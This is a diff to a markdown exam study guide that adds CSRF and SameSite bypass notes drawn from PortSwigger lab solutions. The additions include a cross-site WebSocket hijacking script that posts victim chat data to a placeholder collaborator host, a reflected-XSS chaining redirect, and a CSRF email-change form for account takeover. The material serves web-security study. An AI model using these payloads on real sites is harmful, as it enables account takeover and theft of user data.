@@ -120,6 +120,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 * innerHTML
 * location.search
 * addEventListener  
+* sanitizeKey()  
   
 ### Dom Invader  
 
@@ -1375,6 +1376,8 @@ very-long-strings-so-very-long-string-so-very-long-string-so-very-long-string-so
 [CSRF Token Present](#csrf-token-present)  
 [Is Logged In](#is-logged-in)  
 [CSRF No Defences](#csrf-no-defences)  
+[SameSite Strict bypass](#samesite-strict-bypass)  
+[SameSite Lax bypass](#samesite-lax-bypass)  
   
 >Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they did not intend to perform. This can enable attacker to change victim email address and use password reset to take over the account.  
   
@@ -1576,13 +1579,94 @@ csrf=TOKEN&username=administrator
   
 ### CSRF No Defences  
 
->Target with no defences against email change function, can allow the privilege escalation to admin role. In exam changing the email to the ```attacker@EXPLOIT.NET``` email address on the exploit server can allow the change of password for the low privilege user and can assist in privesc.  
->In the exam there is only on active user, and if the previous stage was completed using attack that did not involve active user clicking on link send from exploit server ```Deliver to Victim``` then this can be used in next stage.  
+>Target with no defences against email change function, can allow the privilege escalation to admin role. In the exam changing the email to the `attacker@EXPLOIT.NET` email address on the exploit server can allow the attacker to change the password of the admin user, resulting in privilege escalation.  
+>In the exam there is only ***one*** active user, and if the previous stage was completed using an attack that did not require the involving of the active user clicking on a link by performing poison cache or performing phishing attack by means of `Deliver to Victim` function, then CSRF change exploit can be used.  
 
 ![csrf-change-email.png](images/csrf-change-email.png)  
 
 [PortSwigger Lab: CSRF vulnerability with no defences](https://portswigger.net/web-security/csrf/lab-no-defenses)  
-  
+
+### SameSite Strict bypass  
+
+>In the live chat function, we notice the `GET /chat HTTP/2` request do not use any unpredictable tokens, this can ***identify*** possible  [cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) (CSWSH) vulnerability if possible to bypass [SameSite](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) cookie restriction.  
+
+>Host on exploit server POC payload to ***identify*** CSWSH vulnerability.  
+
+```
+<script>
+    var ws = new WebSocket('wss://TARGET.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://COLLABORATOR.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```  
+
+>The `SameSite=Strict` is set for session cookies and this prevent the browser from including these cookies in XSS cross-site requests. We ***Identify*** the header `Access-Control-Allow-Origin` in additional requests to script and images to a subdomain at `cms-`.  
+>Browsing to this CDN subdomain at `cms-` and then ***identify*** that random user name input is reflected, confirmed this to be a [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability.  
+
+[cms reflected xss samesite bypass](images/cms-reflected-xss-samesite-bypass.png)  
+
+```
+https://cms-TARGET.net/login?username=%3Cscript%3Ealert%28%27reflectXSS%27%29%3C%2Fscript%3E&password=pass
+```  
+
+>Bypass the SameSite restrictions, by URL encode the entire script below and using it as the input to the CDN subdomain at `cms-` username login, hosted on exploit server.  
+
+
+```
+<script>
+    var ws = new WebSocket('wss://TARGE.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://COLLABORATOR.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```  
+
+>Host the following on exploit server and deliver to victim, once the collaborator receive the victim chat history with their password, result in account takeover.  
+
+```
+<script>
+    document.location = "https://cms-TARGET.net/login?username=ENCODED-POC-CSWSH-SCRIPT&password=Peanut2019";
+</script>
+```  
+
+>The chat history contain password for the victim.
+
+![chat-history.png](images/chat-history.png)  
+
+[PortSwigger Lab: SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)  
+
+### SameSite Lax bypass  
+
+>Observe if you visit `/social-login`, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction., and in proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.  
+
+>Bypass the popup blocker, to induce the victim to click on the page and only opens the popup once the victim has clicked, with the following JavaScript. The exploit JavaScript code first refreshes the victim's session by forcing their browser to visit `/social-login`, then submits the email change request after a short pause. Deliver the exploit to the victim.  
+
+```
+<form method="POST" action="https://TARGET.net/my-account/change-email">
+    <input type="hidden" name="email" value="administrator@exploit-server.net">
+</form>
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://TARGET.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+```  
+
+[PortSwigger Lab: SameSite Lax bypass via cookie refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)  
+    
 -----
 
 ## Password Reset  
@@ -2002,6 +2086,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 [Client-Side Proto](#client-side-proto)  
 [Server-Side Proto](#server-side-proto)  
+[Dom Invader Enable Prototype Pollution](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution)  
   
 ### Client-Side Proto  
 
